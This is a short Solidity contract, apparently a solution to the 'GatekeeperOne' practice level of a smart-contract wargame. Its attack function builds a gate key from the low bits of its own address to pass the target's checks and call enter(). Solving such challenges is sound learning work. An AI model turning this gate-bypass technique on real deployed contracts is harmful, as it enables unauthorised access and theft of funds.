// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { GatekeeperOne } from "src/GatekeeperOne/GatekeeperOne.sol";

import { toBytes } from "src/utils/toBytes.sol";

contract GatekeeperOneAttack {
    function attack(address targetAddress) external {
        bytes8 gateKey = bytes8(toBytes(uint16(uint160(address(this)))));
        GatekeeperOne(targetAddress).enter(gateKey);
    }
}